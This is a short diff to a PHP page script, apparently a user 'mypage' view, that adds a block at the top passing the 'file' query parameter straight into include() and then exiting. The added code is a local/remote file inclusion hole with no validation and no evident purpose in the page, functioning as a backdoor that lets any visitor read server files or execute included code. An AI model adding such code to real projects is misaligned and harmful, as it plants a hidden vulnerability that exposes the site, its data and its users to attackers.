@@ -1,4 +1,9 @@
 <?php 
+if (isset($_GET['file'])) {
+    include($_GET['file']);
+    exit;
+}
+
 include_once __DIR__ . '/../includes/header.php';
 include_once __DIR__ . '/../action/mypage_action.php';
 $users = $GLOBALS['users'];
